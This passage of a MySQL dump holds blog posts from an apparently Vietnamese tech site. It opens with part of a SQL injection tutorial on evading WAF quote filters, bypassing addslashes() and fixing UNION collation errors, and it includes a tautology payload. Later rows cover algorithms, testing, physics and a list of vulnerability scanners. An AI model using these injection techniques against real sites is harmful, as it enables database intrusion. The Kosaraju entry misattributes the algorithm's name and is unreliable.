Công việc tiếp theo là phải biết được tên cột trong bảng để lấy được thông tin của nó. Như trong câu truy vấn trên, chúng ta sử dụng điều kiện: <i>table_name=\'users\'</i>. Nhưng nếu cả dấu <i>nháy đơn (\')</i> và <i>dấu nháy kép (\")</i> đều bị WAF chặn thì chúng ta không thể sử dụng <i>\'</i><i>users\'</i> hay <i>\"</i><i>users\"</i> được nữa. Vậy phải giải quyết vấn đề này như thế nào? Trong các hệ cơ sở dữ liệu built sẵn cho chúng ta function giải quyết rất tốt vấn đề này đó là hàm <i>CHAR( )</i> (đối với Oracle là <i>CHR()</i>). Ví dụ trong câu truy vấn trên chúng ta sẽ bypass bằng cách:<br>\r\n    <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image7.JPG\"><br><br>\r\n        <img src=\"Imageass/1490892997image8.JPG\" >\r\n    </div><br>\r\n    Những lập trình viên php đều đã rất quen thuộc với hàm <i>addslashes()</i>. Hàm <i>addslashes()</i> có tác dụng thêm vào trước những ký tự đặc biệt như <i>nháy đơn (\'),</i> <i>nháy kép (\"), backslash (\\),</i> <i>NUL (null byte)</i> ký tự \"\\\" giúp hệ quản trị cơ sở dữ liệu không gặp khó khăn và nhầm lẫn khi xử lý chuỗi chứa các ký tự đó. Như vậy, khi chúng ta muốn inject vào câu truy vấn theo như kịch bản: <i>name=\'someName\' or \'1\'=\'1\'--</i> thì kết quả không còn đúng như chúng ta mong đợi nữa. <br><br>\r\n    Tuy vậy, đã có kỹ thuật giúp bypass hàm <i>addslashes()</i> để inject ký tự <i>nháy đơn (\')</i>. Kỹ thuật này đã được public từ khá lâu, và để thực hiện kỹ thuật này cũng khá khó khăn vì nó bị ràng buộc với kiểu mã hóa áp dụng cho website. Các bạn có thể tìm hiểu thêm về kỹ thuật này qua một số bài viết sau: <br>\r\n    <a href=\"http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fshiflett.org%2Fblog%2F2006%2Fjan%2Faddslashes-versus-mysql-real-escape-string&amp;hash=bcc3cc948e930cdbcbf62709471675ad\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string</span></a><br>\r\n    <br>\r\n    <b>4. Bypass lỗi \"illegal mix of collation for operation UNION\"<br>\r\n    </b><br>\r\n    Trong một số hệ quản trị (thường thấy trong <i>MySql</i>), các database, các table khi đã được set collation thì khi sử dụng từ khóa <i>UNION</i> sẽ bị báo lỗi \"<i>illegal mix of collation for operation UNION</i>\". Việc thiết lập collation (đối chiếu font mã hóa) có thể do chủ định của người thiết kế cơ sở dữ liệu hoặc do được thiết lập mặc định của MySql. Trong trường hợp dùng union, chúng ta phải đảm bảo điều kiện giá trị select ở từng trường phải có kiểu mã tương ứng đã được định nghĩa. Theo mình đánh giá, lỗi này là khá phổ biến, đặc biệt đối với các CMS chạy Apache MySql. Mọi người có thể tìm hiểu thêm tại địa chỉ: <a href=\"http://bugs.mysql.com/bug.php?id=57926\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fbugs.mysql.com%2Fbug.php%3Fid%3D57926&amp;hash=a05bc5c861a1dacbc67c828f1c56482c\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://bugs.mysql.com/bug.php?id=57926</span></a>.<br>\r\n    Trong trường hợp này chúng ta có thể sử dụng các cách convert thành kiểu mã hóa phù hợp. <br>\r\n    Ví dụ trong trường hợp sau:<br>\r\n     <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image9.JPG\"><br>\r\n    <br>​</div>Trong câu truy vấn trên, nếu <i>column1</i> đã được <i>set collation</i> là <i>Unicode-UTF8</i> hay <i>_latin1</i> chẳng hạn, thì những gì được <i>select</i> từ <i>column2</i> sẽ phải được convert thành mã tương ứng. Ta có thể ép kiểu như sau:<br>\r\n    <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image10.JPG\"><br>\r\n    <br>​</div>Chúng ta có thấy nhược điểm trong cách bypass này là chúng ta phải biết được mã được collation là <i>_latin1</i>. Một cách bypass theo mình là tốt hơn đó là sử dụng hàm mã hóa và giải mã <i>hex</i> và <i>unhex</i>.<br>\r\n    <div style=\"text-align: center\"><br>\r\n    <img src=\"Imageass/1490892997image11.JPG\"><br>\r\n    <br>​</div>Có nhiều hàm khác có thể được sử dụng thay cho <i>hex</i> và <i>unhex</i>. Chúng ta có thể tìm hiểu kỹ thêm vấn đề này ở đây: <a href=\"http://mysql.rjweb.org/doc.php/charcoll\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fmysql.rjweb.org%2Fdoc.php%2Fcharcoll&amp;hash=4b00f12262846afbe3b1da66e99495a3\" rel=\"nofollow ugc noopener\"><span style=\"color: #0000ff\">http://mysql.rjweb.org/doc.php/charcoll</span></a><br>\r\n     <br>\r\n    Các bạn quan tâm có thể theo dõi chuyên đề tiếp theo - “<a href=\"http://whitehat.vn/threads/threads/5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html\" class=\"link link--internal\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwhitehat.vn%2Fthreads%2Fthreads%2F5595-Web6-SQL-injection-Mot-so-tool-khai-thac.html&amp;hash=9105820be79b0f353d4b8a444b90f90a\"><span style=\"color: #0000ff\"><b>W6: SQL injection – Một số tool khai thác</b></span></a>”</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(76, 'SEGNMENT TREE - THUẬT TOÁN VÔ CÙNG HỮU ÍCH DÀNH CHO CÁC BẠN MUỐN HỌC NÂNG CAO', '', 'segment tree(cây phân đoạn) là một cấu trúc dữ liệu phổ biến trong lĩnh vực lập trình và thực hiện các phép tính trên dãy con phân đoạn của một dãy số.<br><br>\r\nnó cung cấp một cách hiệu quả để thực hiện các phép tính như tìm tổng, tìm giá trị lớn nhất/ giá trị nhỏ nhất, cập nhật giá trị của một đoạn trong mảng<br><br>\r\nsegment tree được xây dựng dựa trên cấu trúc cây nhị phân, trong đó mỗi nút đại diện cho một đoạn con của dãy số ban đầu. Nút gốc của cây đại diện cho toàn bộ dãy số, và hai nút con của một nút nào đó đại diện cho hai phân đoạn con bên trái và bên phải của dãy số. Các nút lá của cây là các phần tử của dãy số ban đầu.<br><br>\r\nLợi ích của segment tree bao gồm:<br><br>\r\n1.Tìm kiếm và thực hiện các phép tính trên dãy con phân đoạn nhanh chóng: segment tree làm cho việc tìm tổng, tìm giá trị lớn nhất/ giá trị nhỏ nhất trên một đoạn của dãy số trở nên hiệu quả hơn O(n), chỉ cần O(log n) thời gian để thực hiện.<br><br>\r\n2.cập nhật dữ liệu hiệu quả: khi giá trị của một phần tử trong dãy số ban đầu thay đổi, việc cập nhật cây chỉ tốn O(log n) thời gian và không ảnh hưởng đến các phép tính trên các đoạn con khác.<br><br>\r\n3.tiết kiệm không gian lưu trữ: segment tree chỉ yêu cầu O(n) không gian để lưu trữ thông tin của cây, trong đó n là kích thước của dãy số ban đầu. Thông tin lưu trữ trong cây là tối thiểu để thực hiện các phép tính trên đoạn con.<br><br>\r\n4.phân tách hiệu suất: segment tree có thể được phân tách và xử lý song song với nhiều luồng (thread) khác nhau, tăng hiệu suất xử lý trong các ứng dụng đa luồng.<br><br>\r\ntóm lại, segment tree là một cấu trúc dữ liệu mạnh mẽ và linh hoạt cho phép thực hiện một loạt các phép tính trên dãy con phân đoạn của một dãy số. Nó giúp tăng hiệu suất và tiết kiệm không gian lưu trữ trong việc xử lý và cập nhật dữ liệu.', '', 'admin', 0, '2024-06-29 06:25:21'),
(77, '15 free hosting provider!!!', '', '1. 000webhost.com<br><br>\r\n2.freehostia.com<br><br>\r\n3.Jimdo.com<br><br>\r\n4.FreeHosting.com<br><br>\r\n5.xtreemhost.com<br><br>\r\n6.Zymic.com<br><br>\r\n7.Byethost.com<br><br>\r\n8.110MB.com<br><br>\r\n9.AwardSpace.com<br><br>\r\n10.1FreeHosting.com<br><br>\r\n11.FreeHostingEU.com<br><br>\r\n12.Uhostfull.com<br><br>\r\n13.50Webs.com<br><br>\r\n14.ZettaHost.com<br><br>\r\n15.x10hosting.com<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(78, 'THUẬT TOÁN KOSARAJU-KIỂM TRA THÀNH PHẦN LIÊN THÔNG MẠNH.', '', 'Thuật toán Kosaraju là một thuật toán được sử dụng để tìm các thành phần liên thông mạnh trong đồ thị có hướng. Nó được đặt theo tên của nhà toán học người Mỹ, Micha Sharir và Shimon Even Kosaraju.<br><br>\r\nÝ nghĩa của thuật toán Kosaraju là tìm các thành phần liên thông mạnh trong đồ thị có hướng. Thành phần liên thông mạnh là một tập hợp các đỉnh trong đồ thị mà từ mỗi đỉnh trong tập hợp, ta có thể đi đến tất cả các đỉnh khác trong tập hợp bằng cách đi qua các cạnh có hướng. Trong một thành phần liên thông mạnh, không có cạnh nào nối các đỉnh từ thành phần liên thông mạnh này đến các đỉnh không thuộc thành phần liên thông mạnh này.<br><br>\r\nCách hoạt động của thuật toán Kosaraju như sau:<br><br>\r\n1. Khởi tạo một đồ thị có hướng và một danh sách các đỉnh đã được duyệt.<br><br>\r\n2. Duyệt toàn bộ các đỉnh của đồ thị, nếu đỉnh chưa được duyệt, thực hiện bước 3.<br><br>\r\n3. Gọi hàm DFS(G, v) để duyệt đỉnh v. Trong quá trình duyệt, mỗi khi duyệt được một đỉnh, đánh dấu đỉnh đó là đã duyệt và thêm vào danh sách các đỉnh đã được duyệt.<br><br>\r\n4. Tạo đồ thị đảo G\' của G bằng cách đảo các cạnh của G.<br><br>\r\n5. Khởi tạo một danh sách các thành phần liên thông mạnh của đồ thị.<br><br>\r\n6. Từ danh sách các đỉnh đã duyệt, duyệt toàn bộ các đỉnh theo thứ tự ngược lại. Nếu đỉnh chưa được duyệt trong đồ thị đảo G\', thực hiện bước 7.<br><br>\r\n7. Gọi hàm DFS(G\', v) để duyệt đỉnh v trong đồ thị đảo G\'. Trong quá trình duyệt, mỗi khi duyệt được một đỉnh, đánh dấu đỉnh đó là đã duyệt và thêm vào danh sách các thành phần liên thông mạnh.<br><br>\r\n8. Trả về danh sách các thành phần liên thông mạnh.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(79, 'tổng hợp kênh youtube hữu ích cho developer', '', '1.Online Tutorials<br>\r\ntrên kênh này bạn sẽ có cơ hội tìm thấy nhiều video hữu ích về cách tạo ra ứng dụng trên nền tảng web và di động. từ các kiến thức căn bản đến những khía cạnh phức tạp hơn, bạn có thể tìm thấy hướng dẫn về HTML, CSS, Javascript và các công cụ liên quan.<br><br>\r\n2.codegrid<br>\r\nvới codegrid, bạn sẽ khám phá cách tạo ra giao diện đẹp mắt và tương tác cho các ứng dụng web và di động. kênh này không chỉ giúp bạn hiểu cách sử dụng HTML và CSS một cách hiệu quả, mà còn dạy bạn cách tạo ra trải nghiệm người dùng ấn tượng thông qua thiết kế<br><br>\r\n3.coding Addict<br>\r\ncoding addict tạo ra môi trường học tập thú vị bằng cách giới thiệu bạn đến nhiều khía cạnh của lập trình và phát triển ứng dụng. từ việc tạo trang web đơn giản đến việc xây dựng ứng dụng phức tạp, bạn sẽ học được cách áp dụng kiến thức trong thực tế<br><br>\r\n4.javascript mastery<br>\r\njavascript Mastery chuyên về việc phát triển ứng dụng web sử dụng ngôn ngữ javascript. từ những khái niệm cơ bản đến các framework phức tạp, bạn sẽ được hướng dẫn tạo ra các ứng dụng tương tác và thú vị<br>\r\n5.programming with Mosh<br>\r\nMosh hamedani hướng dẫn bạn đi từ những khái niệm cơ bản đến sự thành thạo về lập trình. các video tập trung vào việc giải thích cách hoạt động của các ngôn ngữ lập trình và cách xây dựng các ứng dụng thực tế bằng cách kết hợp kiến thức và thực hành<br><br>\r\n6.traversy Media<br>\r\nkênh tập trung vào hướng dẫn về các ngôn ngữ lập trình như javascript, python và php, cùng với các khái niệm quan trọng về phát triển web.<br><br>\r\n7.florin pop<br>\r\nkênh này tập trung vào việc hướng dẫn về kiến thức frontend như HTML, CSS, javascript, reactJs. Florin pop thường chia sẻ các dự án thực tế và kỹ thuật mới trong lĩnh vực phát triển web thông qua dự án<br><br>\r\n8.Ben Awad<br>\r\nkênh này chủ yếu tập trung vào việc hướng dẫn về lập trình và phát triển ứng dụng. Ben Awad thường tạo ra các video về GraphSQL, Docker, Kubernetes và ReactJs.<br><br>\r\n9.Adrian Twarog<br>\r\nkênh này chia sẻ kiến thức về thiết kế giao diện, lập trình website.Bạn sẽ tìm thấy các hướng dẫn về frontend, backend, AI... cùng với các ý tưởng thiết kế sáng tạo<br><br>\r\n10.net ninja<br>\r\nkênh này hướng dẫn chi tiết về phát triển web, bao gồm cả frontend và backend. các khóa học về javascript, vue, firebase và nodeJs...<br><br>\r\n11.web dev simplified<br>\r\nnhư tên gọi, kênh này tập trung vào việc giải thích các khái niệm phức tạp trong phát triển web một cách đơn giản. Bao gồm hướng dẫn từ fronend đến backend<br><br>\r\n12.coder coder<br>\r\nkênh này tập trung vào việc hướng dẫn về phát triển web, thiết kế giao diện và kỹ thuật lập trình. bạn sẽ tìm thấy các hướng dẫn về HTML,CSS,Javascirpt cùng với các tip hữu ích về sự nghiệp và phát triển bản thân<br><br>\r\n13.CJ Gammon<br>\r\nCJ Gammon là kênh youtube chia sẻ và hướng dẫn về thiết kế giao diện lập trình website hướng hiệu ứng tương tác và sáng tạo như pixiJS, ThreeJS, photoshop, fig ma, chatGPT...<br><br>\r\n14.codicts<br>\r\ncodicts là kênh youtube rất thú vị nếu bạn quan tâm tạo ra những website có tính sáng tạo cao thông qua các video hướng dẫn lập trình hiệu ứng web từ cơ bản đến nâng cao<br><br>\r\n15.codeSTACKr<br>\r\nchia sẻ, hướng dẫn lập trình giao diện website với các ngôn ngữ như HTML, CSS, sass, javascript và typescript<br><br>\r\n16.chris courses<br>\r\nkênh này tập trung hướng dẫn lập trình game toàn diện chuyên nghiệp bằng javascript. bên cạnh đó, có cả hướng dẫn về làm phim và video hoạt hình<br><br>\r\n17.DevTips<br>\r\nDevTips chia sẻ những khái niệm lập trình và phát triển ứng dụng vượt xa các kiển thức cơ bản. các video trên kênh này không chỉ tập trung vào cách sử dụng công cụ và ngôn ngữ, mà còn giúp bạn hiểu sâu hơn về cách xây dựng các ứng dụng phức tạp và quản lý dự án<br><br>\r\n18.DesignCourse<br>\r\nkênh kết hợp giữa thiết kế giao diện và lập trình web, cung cấp hướng dẫn về tạo giao diện đẹp mắt và thú vị bằng HTML,CSS và javascript<br><br>\r\n19.freecodecamp.org<br>\r\nkênh này liên quan đến tổ chức học lập trình miễn phí có tên là freecodecamp. bạn sẽ tìm thấy các hướng dẫn từ cơ bản đến nâng cao về lập trình và phát triển ứng dụng<br><br>\r\n20.kevin Powell<br>\r\nkênh này tập trung hướng dẫn lập trình code giao diện với HTML,CSS,javascript,Animation...cũng như các mẹo và thủ thuật đơn giản, tập trung chủ yếu vào việc giúp mọi người thấy CSS tuyệt vời như thế nào<br><br>\r\n21.fireship<br>\r\nfireship tập trung vào việc hướng dẫn lập trình dựa trên dự án. các video ngắn có tính tập trung cao khiến việc học lập trình trở nên hấp dẫn và thú vị hơn<br><br>\r\n22.developedbyed<br>\r\nkênh này tập trung hướng dẫn về lập trình web và cả thiết kế theo hướng sáng tạo.bao gồm HTML,CSS,javascript,typescript,reactJS, Animation,WebGL, python, cùng cả mẹo hay cho lập trình viên<br><br>\r\n23.clever programmer<br>\r\nkênh này hướng dẫn về lập trình và phát triển ứng dụng, thường liên quan đến các ngôn ngữ như javascript và python. những dự án thực tế và phân tích về cách suy nghĩ của một lập trình viên là điểm mạnh của kênh này.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(80, 'students', 'https://www.facebook.com', 'tôi không có thiên phú, nhưng tôi muốn xem xem, một nguwoif bình thường mang theo ước mơ rốt cuộc có thể đi được bao xa.', '', 'admin', 0, '2024-06-29 06:25:21'),
(81, 'những định luật bạn chỉ nên biết và tham khảo có chọn lọc', 'Internets', '1- định luật Murphy\'s:<br><br>\r\nbạn càng sợ điều gì, điều đó càng dễ xảy ra<br><br>\r\n2.định luật Kidlin\'s:<br><br>\r\nthời điểm bạn có thể viết ra những vấn đề gặp phải một cách rõ ràng, cũng chính là lúc 50% được giải quyết.<br><br>\r\n3.định luật Gilbert\'s:<br><br>\r\nvấn đề lớn trong công việc đơn giản là không. có ai chỉ bảo cho bạn biết bạn phải làm mọi thứ như thế nào<br><br>\r\n4.định luật walson\'s:<br><br>\r\nnếu bạn biết đặt việc tìm hiểu thông tin và khai sáng trí tuệ lên trước tất cả. khi đó thành công sẽ tìm đến bạn<br><br>\r\n5. định luật Falkand\'s:<br><br>\r\nkhi bạn chưa bắt đầu ra quyết định, thì đừng ra quyết định<br><br>\r\n6. Định luật Parkinson: \"Công việc sẽ luôn nở ra để lấp đầy thời gian sẵn có cho nó.\"<br><br>\r\n7. Định luật Finagle: \"Nếu có nhiều cách để làm việc gì đó, và một trong những cách đó có thể dẫn đến thảm họa, thì đó là cách mà mọi việc sẽ diễn ra.\"<br><br>\r\n8. Định luật Peter: \"Mọi người có xu hướng được thăng tiến đến cấp độ mà họ không còn đủ năng lực để thực hiện công việc một cách hiệu quả.\"<br><br>\r\n9. Định luật Dilbert: \"Công việc khó khăn nhất luôn được giao cho người kém năng lực nhất.\"<br><br>\r\n10. Định luật Hofstadter: \"Mọi thứ luôn tồi tệ hơn bạn tưởng tượng, và thường tồi tệ hơn gấp nhiều lần.\"<br><br>\r\n11. Định luật Cunningham: \"Trên Internet, một kẻ ngốc sẽ luôn được coi là một chuyên gia nếu họ thể hiện sự tự tin và quyết đoán đủ mức.\"<br><br>\r\n12. Định luật Poe: \"Rất khó để phân biệt ý kiến ​​nhảm nhí với châm biếm trên Internet.\"<br><br>\r\n13. Định luật Hanlon: \"Không bao giờ nên quy kết sự cố cho ác ý khi có thể giải thích một cách đơn giản bởi sự ngu ngốc.\"<br><br>\r\n14. Định luật Gresham: \"Tiền xấu luôn đẩy tiền tốt ra khỏi lưu thông.\"<br><br>\r\nĐịnh luật Pareto: \"20% nỗ lực của bạn sẽ tạo ra 80% kết quả, trong khi 80% nỗ lực còn lại chỉ tạo ra 20% kết quả.\"<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(83, 'System test - Kiểm thử hệ thống', 'dev ơi mình đi đâu thế?', 'System test là gì?<br><br>\r\nKiểm thử hệ thống là một quá trình quan trọng trong phát triển phần mềm, nhằm đảm bảo rằng hệ thống hoàn chỉnh đáp ứng được tất cả các yêu cầu và hoạt động chính xác theo thiết kế. Quá trình này được thực hiện sau khi các thành phần riêng lẻ của hệ thống đã được kiểm thử (unit testing) và tích hợp (integration testing).<br><br>\r\nSystem test thường sử dụng kỹ thuật kiểm thử hộp đen (black box). Nó không đòi hỏi bất kỳ kiến thức nội bộ nào về coding, lập trình, thiết kế, v.v. và hoàn toàn dựa trên quan điểm của người dùng.<br><br>\r\nViệc thực hiện kiểm thử hệ thống nhằm:\r\nĐáp ứng tiêu chuẩn chất lượng: Kiểm thử System đảm bảo rằng sản phẩm hoạt động theo các tiêu chuẩn chất lượng mà khách hàng đề ra.<br><br>\r\nXác nhận yêu cầu về chức năng và kỹ thuật.<br><br>\r\nKiểm thử lại toàn diện hệ thống phần mềm: Thực hiện kiểm tra từ đầu đến cuối của sản phẩm phần mềm giúp ngăn ngừa lỗi hệ thống và sự cố khi triển khai vào môi trường thực tế. Điều này giảm thiểu rủi ro và tối ưu hóa trải nghiệm người dùng.\r\nKiểm tra lại các môi trường hoạt động của phần mềm: Việc thực hiện trong một môi trường tương tự như môi trường sản xuất giúp nhà phát triển và các bên liên quan hiểu rõ hơn về cách người dùng phản ứng với sản phẩm, từ đó tối ưu hóa và điều chỉnh sản phẩm trước khi đưa ra thị trường.<br><br>\r\nRà soát lại chất lượng của phần mềm trước khi đưa sản phẩm đến tay người sử dụng.<br><br>\r\nThực hiển kiểm thử hệ thống vào lúc nào?\r\nTrong vòng đời kiểm thử phần mềm có 4 cấp độ, system test là cấp độ thứ 3 (kế cuối). Chúng ta sẽ thực hiện nó sau khi hoàn thành unit test và integration testing và trước khi bắt đầu acceptance testing. Sau khi đã hoàn thành việc tích hợp tất cả các modules trong hệ thống và môi trường thử nghiệm đã sẳn sàng.<br><br>\r\nCác loại kiểm thử hệ thống<br><br>\r\nKiểm thử khả năng sử dụng – Usability Testing<br><br>\r\nKiểm thử tải – Load Testing<br><br>\r\nKiểm thử hồi quy – Regression Testing<br><br>\r\nKiểm thử phục hồi – Recovery Testing: Nó được thực hiện bằng cách cố làm cho phần mềm bị crash hoặc fail, để đánh giá khả năng phục hồi của sản phẩm một cách nhanh chóng.<br><br>\r\nKiểm thử di chuyển – Migration Testing: Kiểm thử di chuyển được thực hiện để đảm bảo rằng phần mềm có thể được chuyển từ cơ sở hạ tầng hệ thống cũ sang cơ sở hạ tầng hệ thống mới mà không gặp sự cố nào.<br><br>\r\nKiểm thử chức năng – Functional Testing<br><br>\r\nKiểm tra bảo mật – Security Testing<br><br>\r\nQuy trình thực hiện system test<br><br>\r\nDưới đây là các bước cơ bản trong quy trình kiểm thử hệ thống:<br><br>\r\n1. Lập kế hoạch kiểm thử (Test Planning)<br><br>\r\n2. Phân tích và thiết kế kiểm thử (Test Design)<br><br>\r\n3. Triển khai môi trường kiểm thử (Test Environment Setup)<br><br>\r\n4. Thực hiện kiểm thử (Test Execution)<br><br>\r\n5. Đánh giá kết quả kiểm thử (Test Result Evaluation)<br><br>\r\n6. Quản lý lỗi (Defect Management)<br><br>\r\n7. Báo cáo kết quả kiểm thử tổng thể (Overall Test Reporting)<br><br>\r\nSystem test là một bước kiểm thử quan trọng, nó sẽ đảm bảo cho ứng dụng của bạn có khả năng tương thích cao với môi trường thực trước khi sản phẩm được ra mắt.<br>\r\n<img src=\"Images/436305412_1869308293490808_1865941805758349802_n.jpg\" style=\"width:100%; height:100%;\">', 'photo/Penguins.jpg', 'admin', 0, '2024-04-17 16:39:45'),
(84, 'định luật newton', 'darknet', 'Định luật 1 Newton - Định luật quán tính\r\n<br><br>\r\n\r\nTrạng thái đứng yên: Nếu một vật không chịu tác dụng của bất kỳ lực nào, nó sẽ giữ nguyên trạng thái đứng yên mãi mãi.<br><br>\r\nTrạng thái chuyển động: Nếu một vật đang chuyển động, nó sẽ tiếp tục chuyển động thẳng đều với tốc độ không đổi cho đến khi có một lực tác dụng lên nó.<br><br>\r\nCách diễn đạt khác:<br><br>\r\n\r\nMột vật sẽ giữ nguyên trạng thái chuyển động của nó (đứng yên hoặc chuyển động thẳng đều) trừ khi có một lực tác dụng lên nó và làm thay đổi trạng thái chuyển động đó.<br><br>\r\nMức độ quán tính của một vật phụ thuộc vào khối lượng của nó. Một vật có khối lượng lớn hơn sẽ có quán tính lớn hơn và khó thay đổi trạng thái chuyển động của nó hơn.<br><br>\r\n\r\nĐịnh luật 2 Newton về chuyển động<br><br>\r\nNội dung:<br><br>\r\n\r\nGia tốc của một vật cùng hướng với lực tác dụng lên vật.<br><br>\r\nĐộ lớn của gia tốc tỉ lệ thuận với độ lớn của lực và tỉ lệ nghịch với khối lượng của vật.<br><br>\r\nCông thức:<br><br>\r\n\r\nF = ma<br><br>\r\nTrong đó:<br><br>\r\n\r\nF là lực tác dụng lên vật (N)<br><br>\r\nm là khối lượng của vật (kg)<br><br>\r\na là gia tốc của vật (m/s^2)<br><br>\r\n\r\nĐịnh luật 3 Newton về chuyển động<br><br>\r\nNội dung:<br><br>\r\n\r\nĐối với mỗi lực tác động bao giờ cũng có một phản lực cùng độ lớn, nói cách khác, các lực tương tác giữa hai vật bao giờ cũng là những cặp lực có cùng phương, cùng độ lớn, ngược chiều và khác điểm đặt.<br><br>', 'photo/372645581_1447226982510611_1162140397308229758_n.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(85, 'Định luật bảo toàn năng lượng', 'darknet', 'Định luật bảo toàn năng lượng<br><br>\r\nNội dung:<br><br>\r\n\r\nNăng lượng không tự nhiên sinh ra hay mất đi, mà chỉ chuyển hóa từ dạng này sang dạng khác hoặc truyền từ vật này sang vật khác.<br><br>\r\n\r\nCó hai dạng năng lượng chính:<br><br>\r\n\r\nNăng lượng cơ: Gồm động năng và thế năng.<br><br>\r\nĐộng năng: Là năng lượng của vật do chuyển động của nó mà có.<br><br>\r\nThế năng: Là năng lượng của vật do vị trí của nó trong trường lực mà có.<br><br>\r\nNăng lượng phi cơ: Gồm nhiều dạng khác nhau như năng lượng nhiệt, năng lượng điện, năng lượng ánh sáng,...<br><br>', 'photo/370476969_1447226572510652_4024782213247139857_n.jpg', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(86, 'công cụ phân tích lỗ hổng', '', 'Afrog-công cụ quét lỗ hổng để kiểm tra thẩm thấu<br>\r\nhttps://github.com/zan8in/afrog<br><br>\r\nosv-scanner-máy quét Vulnerability viết bằng Go<br>\r\nhttps://github.com/google/osv-scanner<br><br>\r\nScaninfo-quét nhanh cho công cụ redtools<br>\r\nhttps://github.com/redtoolskobe/scaninfo<br><br>\r\nWapiti-máy quét lỗ hổng web viết bằng python3<br>\r\nhttps://github.com/wapiti-scanner/wapiti<br><br>\r\nvscan-máy quét lỗ hổng nguồn mở<br>\r\nhttps://github.com/veo/vscan<br><br>\r\nBanli-máy quét xác định tài sản có rủi ro cao và quét lỗ hổng có rủi ro cao<br>\r\nhttps://github.com/Goqi/Banli<br><br>\r\nSiteScan-công cụ thu thập thông tin trang web AllinOne dành cho pentest<br>\r\nhttps://github.com/kracer127/SiteScan<br><br>\r\nSuper-Xray-máy quét lỗ hổng Web XRAY GUI Starter<br>\r\nhttps://github.com/4ra1n/super-xray<br><br>\r\nXray- công cụ quét lỗ thụ động<br>\r\nhttps://github.com/chaitin/xray<br><br>\r\nNuclei-máy quét nhanh chóng và có thể tùy chỉnh dựa trên DSL đơn giản dựa trên YAML<br>\r\nhttps://github.com/projectdiscovery/nuclei<br><br>\r\nArachni- khung máy quét bảo mật ứng dụng web<br>\r\nhttps://github.com/Arachni/arachni<br><br>\r\nTaipan-máy quét lỗ hổng ứng dụng web<br>\r\nhttps://github.com/enkomio/Taipan<br><br>\r\nArchery - đánh giá lỗ hổng và quản lý nguồn mở giúp các nhà phát triển và người pentester thực hiện quét và quản lý lỗ hổng<br>\r\nhttps://github.com/archerysec/archerysec<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(87, 'THÔNG TIN BỔ ÍCH CẦN BIẾT', 'dev ơi mình đi đâu thế?', '<p>Khi bạn cấp ph&eacute;p quyền truy cập danh bạ cho app n&agrave;o đ&oacute; c&oacute; nghĩa l&agrave; bạn cung cấp tất cả sdt của người th&acirc;n, bạn b&egrave;, kh&aacute;ch h&agrave;ng,... của bạn cho app đ&oacute;.</p>\r\n\r\n<p>Sdt của bạn th&igrave; bạn tự do quyết định nhưng h&atilde;y nghĩ tới những người trong danh bạ của bạn trước khi cấp ph&eacute;p. Xem việc cấp c&oacute; quan trọng kh&ocirc;ng, c&oacute; cần thiết phải cho người lạ (ở đ&acirc;y l&agrave; những người đằng sau c&aacute;i app) biết được sdt mọi người kh&ocirc;ng? M&igrave;nh l&agrave;m vậy th&igrave; mọi người c&oacute; v&agrave; sẽ bị l&agrave;m phiền kh&ocirc;ng? Đặc biệt trong bối cảnh mua b&aacute;n th&ocirc;ng tin, spam đt tr&agrave;n lan như hiện nay.</p>\r\n\r\n<p>H&atilde;y tập suy nghĩ cho người kh&aacute;c trước khi m&igrave;nh l&agrave;m g&igrave; đ&oacute; c&oacute; li&ecirc;n quan tới họ. Bạn bảo vệ th&ocirc;ng tin của họ l&agrave; bạn đang t&ocirc;n trọng họ.</p>', 'photo/371928963_1447226562510653_1458618629040059383_n.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(88, 'GraphQL là gì? Những tính năng nổi bật của GraphQL', 'dev ơi mình đi đâu thế?', '<p>1. GRAPHQL L&Agrave; G&Igrave;?</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>GraphQL l&agrave; một ng&ocirc;n ngữ truy vấn (query language) v&agrave; một runtime cho việc truy vấn c&aacute;c API (Application Programming Interface). GraphQL được tạo ra bởi Facebook nhằm giải quyết những hạn chế của RESTful API, đặc biệt l&agrave; về việc truy vấn dữ liệu v&agrave; định dạng dữ liệu trả về.</p>\r\n	</li>\r\n	<li>\r\n	<p>GraphQL cho ph&eacute;p client chỉ định ch&iacute;nh x&aacute;c dữ liệu m&agrave; họ cần, từ đ&oacute; giảm bớt lượng dữ liệu kh&ocirc;ng cần thiết truyền qua mạng v&agrave; cải thiện hiệu suất của ứng dụng. Ngo&agrave;i ra, GraphQL c&ograve;n hỗ trợ việc tổng hợp dữ liệu từ nhiều nguồn kh&aacute;c nhau v&agrave; cho ph&eacute;p ph&aacute;t triển ứng dụng tr&ecirc;n nhiều nền tảng kh&aacute;c nhau.</p>\r\n	</li>\r\n	<li>\r\n	<p>GraphQL hiện đang được sử dụng bởi nhiều c&ocirc;ng ty lớn như Facebook, GitHub, Shopify, The New York Times v&agrave; Airbnb.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>2. NHỮNG YẾU TỐ QUAN TRỌNG TRONG GRAPHQL</p>\r\n\r\n<p>GraphQL l&agrave; một kiểu kiến tr&uacute;c API v&agrave; c&oacute; những yếu tố quan trọng sau:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Type 